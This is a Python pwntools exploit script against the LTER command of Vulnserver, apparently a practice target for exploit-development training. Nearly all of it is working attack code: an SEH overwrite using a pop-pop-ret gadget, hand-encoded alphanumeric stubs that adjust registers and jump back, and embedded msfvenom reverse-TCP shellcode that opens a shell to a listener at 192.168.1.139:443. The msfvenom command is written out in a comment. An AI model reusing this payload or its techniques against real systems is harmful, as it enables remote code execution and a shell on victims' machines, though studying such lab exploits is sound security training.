from pwn import * # pylint: disable=unused-wildcard-import
context.log_level = 'debug' # pylint: disable=assigning-non-slot

# IP and port of the target (Vulnserver).
ip = "192.168.1.135"
port = 9999

# Good chars: 01-7f

# cyclic -l 0x61646A62
offset_seh = 3508
# 0x6250172b : pop edi # pop ebp # ret  | [essfunc.dll]
seh = 0x6250172b # Address of pop pop ret.

nseh = "\x75\x06\x74\x04" # jmp +0x6 (jnz +0x6; jz +0x4 : \x75\x06\x74\x04)

# Here we put the shellcode we want to execute.
offset_sc = offset_seh + 4
# BufferRegister=EAX means that EAX will point at the beginning of shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.139 LPORT=443 EXITFUNC=thread -f c -b "\x00" -e x86/alpha_mixed BufferRegister=EAX
# Payload size: 702 bytes
# Adjust esp to not overwritte our payload and adjust eax to point to beggining payload from ebp
shellcode = ("\x54\x58\x2D\x7F\x14\x01\x01\x05\x01\x01\x01\x01\x50\x5C\x55\x58\x05\x1B\x01\x01\x01\x2D\x01\x01\x01\x01" 
"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" # Here the payload starts(push eax; pop ecx)
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x6d\x38\x4c\x42\x65\x50"
"\x65\x50\x37\x70\x31\x70\x4c\x49\x48\x65\x70\x31\x6f\x30\x42"
"\x44\x6e\x6b\x32\x70\x34\x70\x6e\x6b\x56\x32\x76\x6c\x6c\x4b"
"\x72\x72\x76\x74\x4c\x4b\x74\x32\x64\x68\x76\x6f\x4c\x77\x63"
"\x7a\x35\x76\x46\x51\x79\x6f\x4c\x6c\x47\x4c\x50\x61\x73\x4c"
"\x66\x62\x66\x4c\x51\x30\x6a\x61\x7a\x6f\x64\x4d\x67\x71\x68"
"\x47\x79\x72\x7a\x52\x30\x52\x71\x47\x6e\x6b\x43\x62\x62\x30"
"\x4e\x6b\x51\x5a\x55\x6c\x4c\x4b\x70\x4c\x67\x61\x33\x48\x69"
"\x73\x52\x68\x37\x71\x7a\x71\x56\x31\x4c\x4b\x66\x39\x67\x50"
"\x63\x31\x7a\x73\x4c\x4b\x30\x49\x46\x78\x6a\x43\x77\x4a\x71"
"\x59\x4c\x4b\x50\x34\x6e\x6b\x33\x31\x49\x46\x46\x51\x79\x6f"
"\x6c\x6c\x4f\x31\x6a\x6f\x36\x6d\x73\x31\x49\x57\x56\x58\x4b"
"\x50\x54\x35\x6a\x56\x54\x43\x43\x4d\x69\x68\x35\x6b\x53\x4d"
"\x56\x44\x50\x75\x48\x64\x72\x78\x4c\x4b\x30\x58\x34\x64\x33"
"\x31\x6a\x73\x31\x76\x4c\x4b\x76\x6c\x42\x6b\x6c\x4b\x36\x38"
"\x45\x4c\x66\x61\x4e\x33\x6c\x4b\x33\x34\x6e\x6b\x76\x61\x38"
"\x50\x6d\x59\x31\x54\x36\x44\x56\x44\x61\x4b\x53\x6b\x30\x61"
"\x61\x49\x50\x5a\x46\x31\x39\x6f\x4b\x50\x63\x6f\x33\x6f\x42"
"\x7a\x6c\x4b\x47\x62\x6a\x4b\x4e\x6d\x61\x4d\x51\x78\x74\x73"
"\x74\x72\x65\x50\x63\x30\x35\x38\x61\x67\x34\x33\x37\x42\x61"
"\x4f\x50\x54\x73\x58\x30\x4c\x51\x67\x74\x66\x53\x37\x69\x6f"
"\x7a\x75\x48\x38\x6c\x50\x35\x51\x73\x30\x77\x70\x61\x39\x68"
"\x44\x70\x54\x66\x30\x70\x68\x31\x39\x6b\x30\x52\x4b\x53\x30"
"\x59\x6f\x79\x45\x66\x30\x50\x50\x62\x70\x46\x30\x57\x30\x72"
"\x70\x67\x30\x72\x70\x32\x48\x79\x7a\x34\x4f\x69\x4f\x59\x70"
"\x59\x6f\x78\x55\x6a\x37\x71\x7a\x56\x65\x62\x48\x4f\x30\x4e"
"\x48\x43\x31\x6e\x6b\x45\x38\x33\x32\x33\x30\x65\x51\x6d\x6b"
"\x6c\x49\x79\x76\x62\x4a\x32\x30\x62\x76\x36\x37\x50\x68\x5a"
"\x39\x4f\x55\x33\x44\x33\x51\x69\x6f\x68\x55\x6d\x55\x6f\x30"
"\x34\x34\x36\x6c\x59\x6f\x42\x6e\x46\x68\x31\x65\x58\x6c\x53"
"\x58\x68\x70\x6e\x55\x6c\x62\x42\x76\x4b\x4f\x78\x55\x52\x48"
"\x73\x53\x42\x4d\x55\x34\x45\x50\x4e\x69\x5a\x43\x33\x67\x61"
"\x47\x33\x67\x35\x61\x39\x66\x30\x6a\x47\x62\x73\x69\x51\x46"
"\x79\x72\x49\x6d\x55\x36\x6f\x37\x53\x74\x74\x64\x45\x6c\x46"
"\x61\x65\x51\x4c\x4d\x42\x64\x44\x64\x44\x50\x49\x56\x65\x50"
"\x52\x64\x61\x44\x72\x70\x36\x36\x63\x66\x62\x76\x31\x56\x72"
"\x76\x50\x4e\x76\x36\x62\x76\x73\x63\x52\x76\x75\x38\x44\x39"
"\x7a\x6c\x67\x4f\x4b\x36\x59\x6f\x58\x55\x6e\x69\x39\x70\x30"
"\x4e\x71\x46\x57\x36\x59\x6f\x54\x70\x75\x38\x37\x78\x4e\x67"
"\x65\x4d\x65\x30\x39\x6f\x49\x45\x4d\x6b\x4b\x50\x65\x4d\x65"
"\x7a\x74\x4a\x70\x68\x6e\x46\x5a\x35\x6f\x4d\x6d\x4d\x69\x6f"
"\x59\x45\x37\x4c\x54\x46\x63\x4c\x56\x6a\x6f\x70\x49\x6b\x6d"
"\x30\x31\x65\x33\x35\x4f\x4b\x57\x37\x42\x33\x33\x42\x72\x4f"
"\x31\x7a\x55\x50\x62\x73\x59\x6f\x39\x45\x41\x41")

# We use the first two values in the stack to adjust ESP to point just below us and to generate a value 0x????80EB
# which creates the opcode \xEB\x80(jmp -126) when we push it to the stack
jmp_sc = "\x5B\x58\x05\x01\x12\x01\x01\x2D\x03\x01\x01\x01\x50\x5C\x53\x58\x2D\x5D\x6E\x01\x01\x50"
cmd = "LTER /.:/"

# Adjust ESP to point just after our code
# push esp
# pop eax
# add eax,0x01010101
# sub eax,0x01010135
# push eax

# We encode the following with and and add EAX and push it to stack which makes it appear after our code
# pop esp
# add ebp,777
# jmp ebp
# ebp + 777 points exactly to the beginning of the payload after cmd
add_jmp_ebp = "\x54\x58\x05\x01\x01\x01\x01\x2D\x35\x01\x01\x01\x50\x5C" # Here we adjust ESP
add_jmp_ebp += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
add_jmp_ebp += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
add_jmp_ebp += "\x05\x11\x11\x77\x63" ## add  eax, 0x63771111
add_jmp_ebp += "\x05\x11\x11\x66\x53" ## add  eax, 0x53661111
add_jmp_ebp += "\x05\x11\x11\x55\x62" ## add  eax, 0x62551111
add_jmp_ebp += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
add_jmp_ebp += "\x50"                 ## push eax
add_jmp_ebp += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
add_jmp_ebp += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
add_jmp_ebp += "\x05\x41\x63\x05\x02" ## add  eax, 0x02056341
add_jmp_ebp += "\x05\x40\x62\x04\x01" ## add  eax, 0x01046240
add_jmp_ebp += "\x50"                 ## push eax

# Create our payload.
payload = fit({
    0:cmd,
    len(cmd):shellcode,
    offset_seh -100: add_jmp_ebp,
    offset_seh - 4:nseh,
    offset_seh:seh,
    offset_seh+4:jmp_sc,
    },length=5000)

io = remote(ip,port)
io.readline()
io.sendline(payload)
